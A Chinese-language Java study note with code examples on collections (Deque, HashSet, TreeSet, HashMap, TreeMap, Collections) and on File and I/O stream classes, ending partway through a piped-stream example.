`Vector`从**JDK1.4**被`ArrayList`代替，所以，能不用`Vector`就不用。`Vector`是线程安全的（但是实现很糟糕），`ArrayList`是线程不安全的。`ArrayList`的性能更好。即使在多线程情况下也不要使用`Vector`，而是通过`Collections`工具类来将`ArrayList`转换包装为线程安全的。    

###Queue接口的使用
`queue`接口唯一的继承接口是`Deque`。  
功能：既是队列(`queue`)又是栈(`stack`)。两端都可出可入。实际上就是功能受限制的线性表。实际上就是继承线性表而来的。

####`Deque`接口作栈使用
使用示例：
>
	import java.util.*;
	public class dequeStackTest
	{
		public static void main(String[] args)
		{
			Deque<String> de = new ArrayDeque<>();
>
			//push the elems into the ArrayDeque
			de.push("hi");
			de.push("hello");
			de.push("world");
			de.push("that");
			de.push("is");
>
			//pop the elems out of the ArrayDeque
			System.out.println(de.pop());
			System.out.println(de.pop());
			System.out.println(de.pop());
			System.out.println(de.pop());
			System.out.println(de.pop());
>	
			//push the elems
			de.push("hi");
			de.push("hello");
			de.push("world");
			de.push("that");
			de.push("is");
>		
			//peek the elems of the ArrayDeque, peek but not remove
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
			System.out.println(de.peek());
			de.pop();
		}
	}

####`Deque`作队列使用  
使用示例：
>
	import java.util.*;
	public class dequeQueueTest
	{
		public static void main(String[] args)
		{
			Deque<String> de = new ArrayDeque<>(); 
>			
			//insert at the end of the arraydeque.
			de.offer("hello");
			de.offer("world");
			de.offer("good");
>
			//poll the elem 
			System.out.println(de.poll());
>
			//peek the elem
			System.out.println(de.peek());
		}
	}

`Deque`具有两个子类：  
1. 基于数组的实现，`ArrayQueue`  
2. 基于链表的实现，`LinkedList`  
这两个子类都具有栈和队列的功能，即使它们是基于不同的实现。  
`Deque`只是一个接口，所有的方法都是依靠实现类：`ArrayQueue`与`LinkedList`实现。

###Set接口的使用
####HashSet实现类
`HashSet`的存储机制：实际上其底层是一个数组。  
`HashSet`的构造器：`HashSet(int initialCapacity, float loadFactor)`。  
这里的参数含义分别是：  
a. `initialCapacity`：数组的长度，但是不一定是实际数组的长度，因为这里的数组的长度永远是2的n次方，这样数组实际的长度是最接近与2的n次方的。  
>
	HashSet<String> ha = new HashSet<>(3);//底层数组长度自动扩展到4。

实际上`HashSet`的工作原理是：当感觉底层数组的空间不足的时候，就会自动创建一个长度扩充一倍的底层数组，将原数组中的东西复制倒入，原数组变为垃圾等待回收。这个过程叫**重Hash**。

b. loadFactor：负载因子。  
那么怎样的时候才叫感觉空间不足？  
就是当已使用的空间占总空间比例达到负载因子的时候。负载因子是一个小数。默认0.75，底层数组长度默认16；

`HashSet`存入元素的机制：  
1. 当有对象元素要存入的时候，会调用这个**对象元素**的`HashCode()`方法，获得一个`hash`值。  
2. 根据返回的`hash`值，计算出这个对象元素在底层数组中的存储位置（也就是数组中的索引）。`Hash`值一样则存储位置一样。  
3. 如果要放入的位置是空的，那么直接放入即可。  
4. 如果该位置上已经有了元素，就会调用该元素的`equals()`方法，判断该两个元素是否相等，如果相等，就会抛弃这个相等的元素。如果`equals()`方法判断不相等，就会在此位置上形成链表，同一个位置上的元素形成链表。
所以，这就是为什么`hashset`中的元素要重写`equals()`方法与`hashcode()`方法。  
`HashSet`取出元素的机制：  
1. 当要从`HashSet`中取出一个对象元素的时候，会调用这个对象元素的`HashCode()`方法，获得一个`hash`值。  
2. 根据返回的`hash`值，得出这个对象元素在底层数组中的存储位置。  
3. 如果该位置恰好是要找的元素，直接取出来即可。  
4. 如果这个位置是一个链表，就需要挨个遍历这个链表，直到找到我们要的元素对象。无链表的时候，效率最高。

最理想的情况下，`HashSet`的性能可以接近于数组。  
这里可以知道，当负载参数过大的时候，会导致`HashSet`被装得过满，这样导致大量数组元素位置相重，进而导致链表的出现。降低`HashSet`的性能。  
注：当我们要将一个对象元素存入到`Hash`表中的时候（`HashSet/HashMap`），需要在这个类的对象中重写`HashCode()`方法，因为存入或者取出这个对象元素的时候，都要使用它的`HashCode()`方法  
`HashSet`类使用示例：
>
    //the use of Hashcode() in the HashSet
    //the override of equals()
    import java.util.*;
    class A
    {
	    private int count;
		private String name;
		public A(){}
    	public A(int acount,String aname)
	    {
		    this.count=acount;
			this.name=aname;
	    }
    	//类的判等equals()重写。所谓的equals()判断的是这两个对象的内部Field是否相等。
	    public boolean equals(Object obj)
	    {
		    if(this==obj)
		    {
			    return true;
		    }
		    if(obj!=null&&obj.getClass()==A.class)
		    {
			    A targetobj=(A)obj;
			    if(this.count==targetobj.count&&this.name.equals(targetobj.name))
			    {
				    return true;
			    }
		    }
		    return false;
    	}
	    public int f()
    	{
    		return this.count;
    	}
		//the hashCode() method returns the same value that all the A object stored int the same position
    	public int hashCode()
    	{
    		return 20;
    	}
    }
    public class hashSetTest2
    {
	    public static void main(String[] args)
	    {
	    	HashSet<A> ha = new HashSet<>();
	    	ha.add(new A(1,"wt"));
	    	ha.add(new A(1,"wt"));
	    	ha.add(new A(1,"wt"));
    		System.out.println(ha);
	    	for(A a:ha)
	    	{
	    		System.out.println(a.f());
    		}
    	}
    }

`HashSet`怎样才认为两个对象能够放在底层数组中相同的位置？ 
> 
1. 两个对象通过`equals()`方法判等返回`true`。因为如果对象本身都不相等，那么就没有放在相同位置的必要了。  
2. 这两个对象的`hashCode()`返回值相等。也就是要求两个对象返回的存储位置是一样的。  

这样就要求我们类的自定义方法`hashCode()`与`equals()`是一致的。  
这里的一致，指的是必须在这两个方法中要考虑相同多的类属性。  
那就是：
>
在`equals()`方法中要保证`name`与`num`属性都相等才行，那么在`hashCode()`方法中也必须使用这两个属性来求出`hash`值，从而保证返回的`hash`值能够代表这个两个属性。俱缺一不可。  

也就是说，对于我们自己写的类对象，如果要存入`HashSet`中，那么就要正确重写`equals()`方法与`hashCode()`方法。  
但是对于已经在**JDK**中有的类，我们就不必自己重写这两个方法。因为**JDK**中的类继c承自`Object`类，都已经实现了这两个方法。  

因此，这两个方法相对于上面的必须改写为：
>
    public boolean equals(Object obj)
	{
		if(this==obj)
		{
			return true;
		}
		if(obj!=null&&obj.getClass()==A.class)
		{
			A targetobj=(A)obj;
			if(this.count==targetobj.count&&this.name.equals(targetobj.name))
        	{
    	        return true;
    	    }
    	}
    	return false;
    }
	//the override of hashcode(),use the two all Fields
    public int hashCode()
    {
    	return this.name.hashCode()+this.count;
    }
	public class hashSetTest2
	{
		public static void main(String[] args)
		{
			HashSet<A> ha = new HashSet<>();
			ha.add(new A(1,"lio"));
			ha.add(new A(1,"lio"));
			ha.add(new A(1,"lio"));
>	
			System.out.println(ha);
			for(A a:ha)
			{
				System.out.println(a.f());
			}
		}
	}

`HashSet`的使用示例：
>
	import java.util.*;
	class apple
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
			}
			return false;
		}
		//the override of hashcode(),use the two all Fields
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class hashSetTest
	{
		public static void main(String[] args)
		{
			//the use of LinkedHashSet
			//class String has it's own equals() and hashcode() method.
			LinkedHashSet<String> hp = new LinkedHashSet<>();
			hp.add("张三");
			hp.add("李四");
			hp.add("王五");
			hp.add("赵六");
			System.out.println(hp);
>	
			//the use of HashSet
			//class apple do not has it's own equals() and hashcode() method.
			HashSet<apple> hp1 = new HashSet<>();
			hp1.add(new apple("green",4.3));
			hp1.add(new apple("blue",6.7));
			hp1.add(new apple("black",5.3));
>	
			System.out.println(hp1);
		}
	}

`HashSet`的子类:`LinkedHashSet`  
其存储机制与`HashSet`类似，但是，`HashSet`的底层机制是一个数组(顺序表），而且数据存放位置是一个无顺序的，也就是与放入时顺序无关的，这样，遍历整个`Hashset`的时候就是无序的。  
而`LinkedHashSet`的底层机制是一个链表，这样，在链表中顺序就和放入对象的顺序是一致的，这样在遍历`linkedHashSet`的时候，就是有序的，与放入顺序一样。

####TreeSet实现类
特征：保证`Set`中的元素对象都是已经排好序的，排序的目的在于便于查找、检索。  
对于字符串，按首字母的`ASCII`码排序。  

`TreeSet`是标准的“红黑树”；  
树——>二叉树——>排序二叉树(左子节点小于`root`节点小于右子节点，也叫二叉搜索树）——>平衡排序二叉树(AVL树：任何节点的树高度差不大于1且是排序二叉树，保证整棵树的权值最小)——>红黑树。  

树：**二叉树**（普通二叉树、排序二叉树、AVL树（平衡排序二叉树））、**红黑树**、**扩展树**、**B树**。  
其中，二叉树、红黑树、扩展树是用于内存中元素的管理。`B`树是用于外存（例如硬盘中数据元素的管理的）。

`TreeSet`的底层用一棵红黑树。红黑树的存入、检索性能很好。  
在没有出现大量的“链表（位置重合、重hash）”的情况下，`HashSet`的性能比`TreeSet`的好。而`TreeSet`不受此影响。

`TreeSet`相对于`HashSet`的优点： 
> 
1. `HashSet`中有一定量的空间是空的（内存的浪费），而`TreeSet`的空间利用率要高。  
2. `TreeSet`可以保证集合元素是有序的。

由于`TreeSet`中元素是有序的，所以要求放入到`TreeSet`中的元素对象是可以比较大小的。

`TreeSet`在比较中认为两个元素对象相等的标准：  
只要这两个对象通过`compareTo()`方法返回值是0，那么`TreeSet`就认为两对象相等。而与`equals()`方法无关（只与`compareTo()`方法有关）。所以我们要重写放入`TreeSet`中的元素对象的所属类中`compareTo()`方法。这个方法是`comparable`接口中的方法，所以，对于我们自己所写的类，必须要实现这个接口中这个唯一的这个方法。如果是**JDK**已有的类，我们就不必去自己实现这个方法了，因为已有的类已经实现了这个方法。 

`TreeSet`容器类中比较元素对象大小的两种方式：  
>
1. 自然排序：  
如果在`TreeSet`容器中存放的是**JDK**中已经存在的类对象，由于**JDK**中存在的类已经实现了`compareTo()`方法，不用我们去重写这个方法。这个就是所谓的**自然排序**。  
也就是：我们自己放入`TreeSet`容器中的类对象自己已经实现`Comparable`接口。也就是已经重写了里面的`compareTo()`这个方法。这个方法被自动用于元素大小比较和排序。无需我们自己再次重写。  
元素实现了这个接口之后，元素自身就是可以进行排序的。  
2. 定制排序：对于我们自己写的类，需要自己去实现这个`compareTo()`方法或者我们对于**JDK**中已有的类希望按照自己想要的方式继续排序，就需要在创建`TreeSet`的时候要传入一个`Comparator`对象，这就是所谓的**定制排序**。  
在创建`TreeSet`的时候，提供一个`Comparator`对象，该对象可负责对元素进行比较大小。实际上，这里集合中元素对象无需实现`comparable`接口（本身无排序功能）而是在使`TreeSet`就需要在构造的时候传入一个`Comparator`对象，由于`Comparator`实际上是一个接口。所以传入的是一个`Comparator`匿名内部类对象。通过这个匿名类产生的对象用于进行比较。

`TreeSet`类使用示例
>
	import java.util.*;
	//no need to implements the interface comparable' func compareTo() but transmit an anonymous object Comparator which override the func compare() into the TreeSet
	class apple 
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
			}
			return false;
		}
		//the override of hashcode()
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class treeSetTest
	{
		public static void main(String[] args)
		{
			//use TreeSet class
			//class String has implements the interface comparable itself that we do not have to implement it by ourselves.
			TreeSet<String> ts = new TreeSet<>();
			ts.add("张三");
			ts.add("李四");
			ts.add("王五");
			ts.add("赵六");
			System.out.println(ts);
>	
			//use TreeSet class
			//class apple do not has implements the interface comparator itself that we must implement it by ourselves。In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeSet<apple> ts1 = new TreeSet<>(new Comparator<apple>(){
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeSet.
			@Override
			public int compare(apple o1,apple o2)
			{
				if(o1.weight>o2.weight)
				{
					return 1;
				}
>		
				else if(o1.weight<o2.weight)
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
			});
>	
			ts1.add(new apple("green",4.3));
			ts1.add(new apple("blue",6.7));
			ts1.add(new apple("black",5.3));
			System.out.println(ts1);
>	
			//use TreeSet class
			//class String has implements the interface comparator itself but we want it compare as the method we want 
			//that we implement it by ourselves.In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeSet<String> ts2 = new TreeSet<>(new Comparator<String>(){
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeSet.
			@Override
			public int compare(String o1,String o2)
			{
				if(o1.length()>o2.length())
				{
					return 1;
				}
>		
				else if(o1.length()<o2.length())
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
			});
			ts2.add("green");
			ts2.add("blue");
			ts2.add("esddfa");
			System.out.println(ts2);
		}
	}




##操作Collection的工具类Collections
常用工具类：  
`Arrays`类：操作数组。  
`Objects`类：操作对象。  
`Collections`类：操作集合。  
`Integer`类：操作将`String`转换为`Integer`。

当我们在已有的这个类中没有找到所需要的方法的时候，要达到我们的目的，就需要自己去写这个方法，这个时候要注意把这个方法包装放在一个类中，作为`static`方法出现，这样就产生了一个工具类，这样才是良好的面向对象方法。  
例如：
我们有一个`String`数组，需要依据数组的元素去确定这个元素的`index`，这个时候，发现工具类`Arrays`中并没有这种方法。  
所以需要自己去创建这个方法`int find(String[] strArrays,String str)`，要将它作为`static`方法包装在一个类中。
> 
	//find the index of the elem in the array 
	class arraysUtil
	{
		static int find(String[] strArrays,String str)
		{
			int len = strArrays.length;
			int i=0;
			for(;i<len;i++)
			{
				if(str.equals(strArrays[i])==true)
				{
					return i;
				}
			}
			return -1;
		}
	}

这样我们就创建了一个工具类`arraysUtil`类，以后可以直接使用这个类的`static`方法来查找字符串数组中的元素的`index`。
`Collections`工具类中所有方法都是`static`方法。
>
	import java.util.*;
	public class collectiosTest
	{
		public static void main(String[] args)
		{
			List<String> ls = new ArrayList<>();
>			
			ls.add("hi");
			ls.add("hello");
			ls.add("good");
			System.out.println(ls);
>
			//reverse the List
			Collections.reverse(ls);
			System.out.println(ls);
>
			//swap the specific elems in the list
			Collections.swap(ls,1,2);
			System.out.println(ls);
>
			//shuffle the elems in the list
			Collections.shuffle(ls);
			System.out.println(ls);
		}
	}


`synchronizedXXX(Collections<T> cl)`：用于将集合包装成线程安全的集合。

所谓的重构：就是让方法适用于更多的情况。

##Map接口的使用(见图：`Map_Structure.png`)
`Map`里面存放的东西是：很多的`key-value`对。每一项数据都是这样的键值对。也就是说，`Map`就是很多的`key-value`对的集合。
  
`Map`中将`value`当做`key`的附属物。在`key-value`的存储中，只需考虑`key`的存储即可。`key`存储之后，`value`会跟着`key`进行存储。  
如果，只考虑`key`的存储，那么将所有的`key`存储在一起，就是一个`Set`。 
 
实际上，`Map`与`Set`的一一对应的：
`HashSet`的底层是依靠`HashMap`实现的，`HashMap`依靠`hash`算法以确定在其底层数组中的位置。  
`TreeSet`的底层是依靠`TreeMap`实现的，`TreeSet`底层就是一个**红黑树**。
  
常用的实现了`Map`接口的类有3个：`HashMap`与`TreeMap`、`HashTable`。  
### `HashMap`实现类  
会根据其存、取的元素对象的`key`值的`hashCode()`方法的返回值来确定这个`key`值的存放位置，也随之确定`key-value`对的储存位置。  

`HashMap`也不允许`key`重复。那么怎样才是`key`重复？这里和`HashSet`是一样的。  
- 通过`equals()`返回`true`.    
- 通过`hashCode()`返回值相等.   
那么，在我们用一个**自己写的类**作为`HashMap`的`key`的时候，必须要自己正确地重写这个类的`equals()`方法和`hashCode()`方法；  
但是对于已经在`JDK`中有的类，我们就不必自己重写这两个方法。因为`JDK`中的类继承自`Object`类，都已经实现了这两个方法。  
`HashMap`实际上是无序放置的，所以，为了有序存、取。可以使用`HashMap`的子类`LinkedHashMap`来进行存取。这样就是有序的。

`HashMap`的使用示例:
>
	import java.util.*;
	class apple
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
>			
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
			}
			return false;
		}
		//the override of hashcode()
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class hashmapTest
	{
		public static void main(String[] args)
		{
			//the use of LinkedHashMap
			//class String has it's own equals() and hashcode() method.
			LinkedHashMap<String,Integer> hp = new LinkedHashMap<>();
			hp.put("张三",90);
			hp.put("李四",80);
			hp.put("王五",70);
			hp.put("赵六",60);
			System.out.println(hp);
>	
			//the use of HashMap
			//class apple do not has it's own equals() and hashcode() method.
			HashMap<apple,Integer> hp1 = new HashMap<>();
			hp1.put(new apple("green",4.3),4);
			hp1.put(new apple("blue",6.7),5);
			hp1.put(new apple("black",5.3),6);
>	
			System.out.println(hp1);
		}
	}  

### `TreeMap`实现类  
其底层的红黑树只对`key`进行排序放置。这就表示`key`必须是可以比较大小的。  
- 自然排序：对于`key`都要实现`Comparable`接口。  
- 定制排序：要求在创建`TreeMap`的时候提供一个`Comparator`以实现比较。

`TreeMap`也不允许`key`重复。那么怎样才是`key`重复？  
- 只要这两个元素对象通过`compare()`方法返回值是0，那么`TreeSet`就认为二对象相等。而与`equals()`方法无关（只与`compare()`方法有关）。  
- 所以我们要重写放入`TreeSet`中的元素对象的所属类中`compareTo()`方法。这个方法是`comparable`接口中的方法，所以，对于我们自己所写的类，必须要实现这个接口中这个唯一的这个方法。

如果是**JDK**已有的类，我们就不必去自己实现这个方法了，因为已有的类以及实现了这个方法。这就是*自然排序*。  
 
对于我们自己写的类需要自己去实现这个`compare()`方法或者我们对于JDK中已有的类希望按照自己的方式去排序，就需要在创建`TreeMap`的使用要传入一个`Comparator`对象，这就是所谓的*定制排序*。  
也就是说在我们用一个**自己写的类**作为`TreeMap`的`key`的时候，必须要自己正确地使这个类实现`Comparator`接口的`compare()`方法；实际上采用的是匿名内部类的形式给`hashMap`提供一个`Comparator`对象。

`TreeMap`的使用示例：
>
	import java.util.*;
	class apple 
	{
		String color;
		double weight;
		public apple()
		{
			this.color = "red";
			this.weight = 10.0;
		}
		public apple(String acolor,double aweight)
		{
			this.color = acolor;
			this.weight = aweight;
		}
>	
		//the override of toString()
		@Override
		public String toString()
		{
			return "apple[color:"+this.color+"weight:"+this.weight+"]";
		}
		//the override of equals()
		@Override
		public boolean equals(Object obj)
		{
			if (this == obj)
			{
				return true;
			}
>			
			if(obj!=null&&obj.getClass()==apple.class)
			{
				apple app = (apple)obj;
				if((this.weight==app.weight)&&(this.color.equals(app.color)))
				{
					return true;
				}
			}
			return false;
		}
		//the override of hashcode()
		@Override
		public int hashCode()
		{
			return color.hashCode()+(int)weight;
		}
	}
	public class TreeMapTest
	{
		public static void main(String[] args)
		{
			//use TreeMap class
			//the key class String has implements the interface comparable itself that we do not have to implement it by ourselves.
			TreeMap<String, Integer> ts = new TreeMap<>();
			ts.put("张三",90);
			ts.put("李四",80);
			ts.put("王五",70);
			ts.put("赵六",60);
			System.out.println(ts);
>	
			//use TreeMap class
			//the ke class apple do not has implements the interface comparator itself that we must implement it by ourselves.In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeMap<apple,Integer> ts1 = new TreeMap<>(new Comparator<apple>(){
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeMap.
			@Override
			public int compare(apple o1,apple o2)
			{
				if(o1.weight>o2.weight)
				{
					return 1;
				}
>		
				else if(o1.weight<o2.weight)
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
			});
>	
			ts1.put(new apple("green",4.3),4);
			ts1.put(new apple("blue",6.7),5);
			ts1.put(new apple("black",5.3),6);
			System.out.println(ts1);
>	
			//use TreeMap class
			//class String has implements the interface comparator itself but we want it compare as the method we want 
			//that we implement it by ourselves.In this sample，we use anonymous class to override the func of compare() in the interface Compatator.
			TreeMap<String,Integer> ts2 = new TreeMap<>(new Comparator<String>(){
			@Override
			//use anonymous class to override the func compare() in the interface Comparator to provide a Comparator object for TreeMap.
			public int compare(String o1,String o2)
			{
				if(o1.length()>o2.length())
				{
					return 1;
				}
>		
				else if(o1.length()<o2.length())
				{
					return -1;
				}
>	
				else
				{
					return 0;
				}
			}
			});
			ts2.put("green",4);
			ts2.put("blue",5);
			ts2.put("esddfa",6);
			System.out.println(ts2);
		}
	}

### `HashTable`  
`HashTable`与`HashMap`的区别：  
- `HashTable`自**JDK1.0**开始即有，已落后，能不用就不用。与`Vector`类似。    
- `HashTable`不允许使用`null`作`key`值，但是`HashMap`允许。  
- `HashTable`是线程安全的(但是实现不好),`HashMap`线程不安全，但是性能好。可以通过`Collections`工具类将`HashMap`类包装成线程安全的。所以尽量不用`HashTable`。  
- 除以上几点之外，其他的都是相同的。

总之，无论是`Set`还是`Map`。  
1. 前面带了`Hash`表明的是这个集合存、取元素寻找位置的方式是通过`equals()`方法和`hashCode()`方法的返回值来确定存、取元素在底层数组中的位置的。  
2. 前面带了`Tree`表明的是这个集合存、取元素的是在红黑树中进行的，这个排序过程是通过两种方式进行的，只要元素对象具有排序功能，就能够在红黑树中进行存、取。  
要么是对象本身就拥有比较功能，也就是**JDK**中已经提供了。要么就是我们自己写的类，需要在定义集合的时候向这个集合中通过匿名内部类的形式传入`Comparator`对象。


`Iterator`接口：用于遍历一个集合中的元素。

注：所谓的散列表，实际上就是指通过`hash`值来确定对象在数组中的储存位置的数组，如，`hashSet`、`hashtable`、`hashMap`都是属于散列表。一般散列表不是一个有序的方式，不过查找时间是一个常数。  
注：无论是数据库还是数据结构(集合)，所有对数据的操作不过是：*增、删、改、查*4种而已。




#Java中的异常处理
----------------


-----------
#Java中的输入与输出
-----------
所谓的输入与输出，实际上就是以*内存为中心*，硬盘↔内存，内存→显示屏，键盘→内存，网络↔内存。这三者之间的信息传输的过程。
##基础知识
`File`类：代表硬盘里面的一个文件或者目录。  
`File`类的方法：  
1. `listRoots()`：列出所有的根目录。  
2. `exists()`:判断文件、目录的存在。  
3. `getPath()`:获取文件的路径。  
4. `mkdir`:创建文件。  
5. `listFiles()`：列出当前目录下所有的文件。  
6. `listFiles(FileFilter filter)`：列出当前目录下符合条件的文件与目录。  
7. `listFiles(FilenameFilter filter)`：列出当前目录下符合条件的文件与目录。  

`File`类使用示例：  
> 
	import java.io.*;
	import java.util.*;
	public class fileTest
	{
		public static void main(String[] args) 
		{
			//get the path of the file.
			File file = new File("E:/git/git_note");
			System.out.println(file.getPath());
>			
			//list the roots of the disk
			File[] roots = File.listRoots(); 
			System.out.println(Arrays.toString(roots));
>			
			//verify the existense of the directory then mkdir
			File file1 = new File("git_note");
			System.out.println(file1.exists());
			if(!file1.exists())
			{
				file1.mkdir();
			}	
>			
			File file2 = new File("E:/Books");
			//list the directories in the disk
			File[] file3 = file2.listFiles();
			for(File temp_file:file3)
			{
				System.out.println(temp_file);
			}
>					
			//list all the  files with specified suffin in the directory		
			myFilterlist(file2);
			//list all the files in the directory	
			mylist(file2);
		}
>	
		//list all the  files with specified suffin in the directory
		public static void myFilterlist(File dir) 
		{
			File[] temp = dir.listFiles(new FileFilter()
				{
				public boolean accept(File pathname) 
				{
					try
					{
						if(pathname.getCanonicalPath().endsWith(".txt"))
							{
								return true;
							}
					}
					catch(IOException ex)
					{
						ex.printStackTrace();
					}
					return false;
				}
				}
				);
				for(File f2:temp)
				{	
					System.out.println(f2);
				}
>							
				File[] temp1 = dir.listFiles();
				for(File f1:temp1)
				{
					if(f1.isDirectory())
						{
							myFilterlist(f1);
						}
				}
		}
>		
		//list all the files in the directory
		public static void mylist(File dir) 
		{
			if(dir.isDirectory())
			{
				File[] temp = dir.listFiles();
				for(File f2:temp)
				{	
					if(f2.isFile())
					{
						System.out.println(f2);
					}
					else
					mylist(f2);
				}
			}
		}
	}
 
`I/O`流：`File`类只能访问磁盘中的文件与目录*名字与路径*，但是不能*读取文件*。  
如果要读取文件，就需要使用`I/O`流。  

按**流的方向**来分：  
分为输入、输出流。  
注：输入、输出流都是在内存的角度来看的。  

按**流处理的数据类型**来分：  
>
字节流：处理的对象是字节。功能强大，例如：图片、音乐。  
字符流：处理的对象时字符。主要用于文本文件，如：`txt`文件。处理文本文件时，比字节流更方便。

按**流的角色**来分：  
>
节点流：直接与一个`I/O`的物理节点（如，磁盘上的文件、网络等）关联。  
包装流(处理流/过滤流)：以节点流为基础，包装之后得到的流。  

常用的有4个抽象流类：  
`InputStream`、`OutputStream`：字节流。  
`Reader`、`Writer`：字符流。  
所有的`I/O`流都是以上的四个流为**基础**的。

##各种流类的使用  
**一个流对象相当于一根水管**，里面的每一滴水就相当于一个数据单元，如果是字节流，那就是一个字节。如果是字符流，那就相当于一个字符。  
  
a. 对于输入流而言，创建一个输入流对象的时候，里面就有数据。  
例如:  
将一个文件`File`对象包装进一个输入流对象。里面就拥有了水滴。我们要做的就是将这个输入流对象中的那些数据传送到程序中，也就是内存中。  
b. 对于输出流而言，是不同的。创建一个输出流对象的时候，里面是没有数据的，也就是说里面没有水滴，我们所要做的就是将程序中所产生的数据传送到这个空水管中。
  
按照节点流类与包装流类进行分类：
节点流类：表示与一个外界的实体相连接的流类。如，文件、网络等。  
包装流类：不是直接与外界实体相连接，而是将节点流类进行包装之后的流类，功能更强大。

`IM:`  
节点流类与包装流类的异同点在于：  
1. 节点流类：每一个节点流类都是与特定的节点相连接的管子。用于内存与对应的节点之间相连。也就是说一个节点流类只能用于一种节点。因为每一个节点流类的构造函数只能接受一种特定的参数。  
2. 包装流类：每一个包装流类都是可以与任何种类的节点相连接的管子。其作用也是用于内存与节点之间相连接。每一个包装类是可以用于任何一种节点的。因为每一个包装类的构造函数可以接收各种不同种类的节点流类，这些不同的节点流类代表了各种不同的节点。  


怎样选择合适的流类？  
1. 对于内存而言，当要其向外输出内容的时候，要使用output、writer流类，构造时构造方法里面的参数是输出数据的目的地，无论是节点还是节点流类均有。  
2. 对于内存而言，当需要向内存中写入内容的时候，要使用input、reader流类，构造时构造方法里面的参数书输入数据的来源，无论是节点还是节点流类均有。  

###节点流类  
a. 文件节点流（与文件相连接，对文件内容进行操作）。  
b. 数组节点流（与字节、字符数组相连接，对数组内容进行操作）。  
c. 管道节点流（与管道相连接，对管道内容进行操作）。  
d. 字符串节点流（与字符串相连接，对字符串内容进行操作）。  


**文件节点流**：用于*访问文件的节点流*。如同一个管道，用于内存与文件相连接。  
`FileInputStream`、`FileOutputStream`：文件字节流。  
`FileReader`、`FileWriter`：文件字符流。  

`FileInputStream`方法：  
 `read()/read(byte[] b)`：将文件中的字节读入到内存中。  

`FileOutputStream`方法：  
 `write(byte[] b)`：将内存中的`byte`数组写入到文件中。

文件节点流类使用举例：
>
	import java.io.*;
	import java.util.*;
	public class fileStreamTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a fileinputstream,just like get a pipe with water in it.that you can pipe the water into the RAM.
			FileInputStream fis = new FileInputStream("E:/Java_source/fileStreamTest.java");
>
			//read the file by one byte
			System.out.print((char)fis.read());
>
			//read all the file by bytes 
			byte[] buffer1 = new byte[64];
			int len1 = 1;
			while((len1 = fis.read(buffer1))!=-1)
			{
				System.out.print(new String(buffer1,0,len1));
			}
>
			//read the file by bytes into a specified length buffer arrays 
			FileInputStream fis1 = new FileInputStream("E:/Java_source/fileStreamTest.java");
			byte[] buffer = new byte[128];
			fis1.read(buffer);
			System.out.println(new String(buffer));
>
			//output into the file with the FileOutputStream class 
			FileOutputStream fis2 = new FileOutputStream("E:/Java_source/2.java");
			byte[] buffer3 = "hello".getBytes();
			fis2.write(buffer3);
			fis2.close();
		}
	}



**数组节点流类**：用于访问数组。如同一个管道，用于内存和数组相连接。  
`ByteArrayInputStream`、`ByteArrayOutputStream`：访问字节数组流类。  
`CharArrayReader`、`CharArrayWriter`：访问字符数组流类。

数组节点流类使用举例：  
>	
	import java.io.*;
	public class ArrayStreamTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a ByteArrayOutputStream,just like get a pipe without water in it.that you can pipe water into it.
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
>
			byte[] buffer = "hello".getBytes();
			bos.write(buffer);
>		
			byte[] content = bos.toByteArray();
			for(byte b : content)
			{
				System.out.println((char)b);
			}
		}
	}


**管道节点流类**：如同一个管道，该流类用于用于线程与线程相连接。  
`PipedInputStream`、`PipedOutputStream`：访问管道字节流类。  
`PipedReader`、`PipedWriter`：访问管道流字符流类。  
所谓的管道：两个线程之间进行通信的连接。所以要使用管道节点流类，需要运行两个线程，内存中的两个线程都与管道相连接，其中一个线程具有管道输入流对象，另一个线程具有管道输出流对象。然后两个线程就可以通过管道进行线程间数据的传输。  
管道节点流使用示例：  
>
	import java.io.*;
	class sender extends Thread
	{
		private PipedOutputStream out=new PipedOutputStream();
		public  PipedOutputStream getPipeOutputStream()
		{
			return out;
		}
		public void run()
		{
